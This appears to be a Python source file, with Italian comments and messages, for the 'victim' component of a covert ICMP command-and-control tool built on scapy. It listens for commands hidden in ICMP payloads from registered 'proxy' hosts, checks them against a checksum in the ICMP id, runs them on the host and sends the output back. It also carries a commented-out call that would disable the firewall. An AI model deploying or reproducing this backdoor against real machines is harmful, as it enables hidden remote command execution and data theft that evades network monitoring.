#from scapy.all import * 
from scapy.all import IP, ICMP, Raw, AsyncSniffer

import sys
import os
import argparse
import random 
import threading
import sys
import select  
import ipaddress 

from mymethods import *
from custom_enum import * 
from network_methods import *
from thread_methods import THREADING_EVENT 

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 
from attacksingleton import * 
from attacksingleton import _IPx
from custom_enum import SENDER_TRUE_SENDER, MSG, ATTACK_TYPE
from get_type import * 
from thread_methods import THREAD_VICTIM

#---------------------

def choose_proxy(proxy_list:list[ipaddress.IPv4Address]): 
    if not is_list(proxy_list): 
        raise Exception("choose_proxy: Argomenti non corretti") 
    print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}") 
    if not is_list(proxy_list) or len(proxy_list)<=0:
        raise ValueError("choose_proxy: Argomenti non corretti") 
    return random.choice(proxy_list) 

def get_data_from_command(process_shell):
    count=0
    print(f"Did command failed? {process_shell.poll() is not None}") 
    data=[]
    there_is_smth_to_read=True
    while there_is_smth_to_read: 
        count+=1
        print(f"lettura dei dati... {count}")
        print("UUU")
        reads = [process_shell.stderr.fileno(),process_shell.stdout.fileno()] 
        print("UUU")
        ret = select.select(reads, [], [], 1.0)  # 1s timeout for safety 
        for fd in ret[0]:
            if fd == process_shell.stdout.fileno(): 
                output_line = process_shell.stdout.readline()
                if output_line:
                    stripped_data=output_line.strip()
                    print("stdout:",stripped_data)
                    data.append(stripped_data) 
                    if MSG.END_DATA.strip() in stripped_data:
                        print(f"No more lines to read")
                        there_is_smth_to_read = False
                        break
                else:
                    print(f"stdout EOF {output_line}") 
                    there_is_smth_to_read = False
            if fd == process_shell.stderr.fileno(): 
                error_line = process_shell.stderr.readline()
                if error_line:
                    stripped_data=error_line.strip()
                    data.append(stripped_data)
                    print("stderr:", stripped_data) 
                    there_is_smth_to_read = False  
                    break
                else:
                    print(f"stderr EOF {output_line}") 
                    there_is_smth_to_read = False  
                    break
        # Optional: check if process exited early
        #if process_shell.poll() is not None and there_is_smth_to_read:
            #print("Process exited but streams may still have data")
    print(f"Command finished with exit code {process_shell.poll()}")
    return data 

def _windows_get_data_from_command(process_shell):
    data = []
    while True:
        line = process_shell.stdout.readline()
        if not line:
            break
        data.append(line.strip())
    return data
    #stdout_data, stderr_data = process_shell.communicate()
    #return stdout_data.splitlines(), stderr_data.splitlines() 

def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Event, comando:list): 
    def callback(packet):
        nonlocal comando, connected_proxy, event_pktconn
        print(f"callback wait_for_command received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.CONFIRM_COMMAND.encode() in packet[Raw].load:
                comando.append(packet[Raw].load.decode().replace(MSG.CONFIRM_COMMAND,""))
                checksum=mycalc.checksum((MSG.CONFIRM_COMMAND+comando[0]).encode())
                print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                if packet[ICMP].id==checksum: 
                    print(f"Ricevuto il comando {comando}")
                    threadevent.set(event_pktconn)
                    return 
            if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
                print(f"Received packet from not recognized address {packet[IP].src}")
            if MSG.CONFIRM_COMMAND.encode() not in packet[Raw].load:
                print(f"Payload doesn't have CONFIRM_COMMAND: {packet[Raw].load}")
            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.END_COMMUNICATION.encode() in packet[Raw].load:
                print(f"End of communication ")
                comando.append(packet[Raw].load.decode()) #packet[Raw].load.decode().replace(END_COMMUNICATION,"")
                threadevent.set(event_pktconn)
                return
    return callback

#---------------- 
class ADD_TO_METHODS:
    def get_ip_host(): 
        while True: 
            ip_host, errore=IP.find_local_IP() 
            if errore:
                print("errore:",errore)  
                msg="Inserire indirizzo IP dell'host:\n\t#" 
                ip_host=input(msg)
            try:  
                return ipaddress.ip_address(ip_host) 
            except Exception as e: 
                print(e) 
                return None 
def check_value_in_parser(args): 
    try:
        if not isinstance(args,argparse.Namespace):
            raise Exception("Argomento parser non è istanza di argparse.Namespace")  
        if not isinstance(args.num_proxy, int):
            raise ValueError("Il numero di proxy non è un intero") 
    except Exception as e: 
        raise Exception(f"check_value_in_parser: {e}") 
    return True 

#---------------- 
class CONNECTED_PROXY: 
    def __init__(self): 
        self.proxy_list:list[ipaddress._IPAddressBase]=[]
        self.lock:threading.Lock=get_threading_Lock() 
        self.enough_event:threading.Event=get_threading_Event() 
        self.type_attack:dict[str:str]={}



WAITING_TIME=20
DEBUG=False 
type_sender=SENDER_TYPE.TRUE_SENDER 
use_delay=False
class Victim:  
    attack_function:ATTACK_TYPE=None  

    def __init__(self,num_proxy:int=None): 
        self.ip_host=ADD_TO_METHODS.get_ip_host() 
        if not is_ipaddress(self.ip_host): 
            raise TypeError("ip_host non valido")  
        if not is_integer(num_proxy): 
            raise Exception("Numero connesisoni non valido:",num_proxy)
        self.num_proxy=num_proxy 
        if not is_integer(self.num_proxy): 
            raise TypeError("num_proxy non valido")
        self.connected_proxy=CONNECTED_PROXY() 
        if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
            raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
        if not is_list(self.connected_proxy.proxy_list): 
            raise TypeError("proxy_list non valido") 
        if not is_threading_Lock(self.connected_proxy.lock): 
            raise TypeError("lock non valido")  
    
    def start(self):  
        if not is_integer(self.num_proxy) or self.num_proxy<=0: 
            raise ValueError("Numero proxy non valido:",self.num_proxy)  
        print("IP della macchina:", self.ip_host) 
        print("Proxy richiesti:",self.num_proxy) 
        try: 
            #FIREWALL.disable() #TODO decommentare 
            self.check_variables() 
            print("Waiting connections...")  
            object_wait_proxy=THREAD_VICTIM.WAIT_CONNECTIONS(
                self, self.num_proxy, self.connected_proxy
            ) 
            object_wait_proxy.start(self.ip_host)  
            print("Proxy disponiili:",len(self.connected_proxy.proxy_list)) 
            print("Attacchi scelti:",len(self.connected_proxy.type_attack)) 
            if not is_enum_member(self.attack_function, ATTACK_TYPE): 
                raise TypeError("attack_function non valida") 
            self.connected_proxy.lock.acquire()
            host_connessi=len(self.connected_proxy.proxy_list)
            self.connected_proxy.lock.release()
            if host_connessi<self.num_proxy: 
                if host_connessi<=0: 
                    print("Lista proxy vuota") 
                    raise SystemError("Interruzione del programma...")  
                msg="Non sono stati trovati abbastanza proxy\nUtilizzare quelli trovati? [si/no]" 
                scelta=ask_bool_choice(msg)  
                if not scelta: 
                    print("Si è scelto di non continuare") 
                    raise SystemError("Interruzione del programma...")  
                print("Continuo con i proxy trovati...")  
                return  
            else: print("Si sono conessi abbastanza proxy...") 
            object_comand=THREAD_VICTIM.WAIT_COMMAND()
            while True: 
                try: 
                    object_comand.start() 
                    data=EXCEUTE_COMMAND(object_comand.comando).data
                    print("Command executed...") 
                    object_send=THREAD_VICTIM.SEND_DATA(self, data) 
                    print("Finished sending data...") 
                except Exception as e: 
                    print(e)
                    break
            print("Closing connection")
        except Exception as e:
            print(e)
            FIREWALL.enable()
            exit(1) 
        finally: 
            FIREWALL.enable() 

if __name__ == "__main__": 
    args=ARGS_CONFIG.FROM_COMMAND(ENTITY.VICTIM).args 
    if not is_namespace(args): 
        exit(-1) 
    if not is_string(args.file_path):
        config_args=ARGS_CONFIG.FROM_FILE(args.file_path) 
    else: config_args=ARGS_CONFIG.FROM_FILE(None) 
    vittima=Victim(config_args.num_proxy ) 
    vittima.start() 
    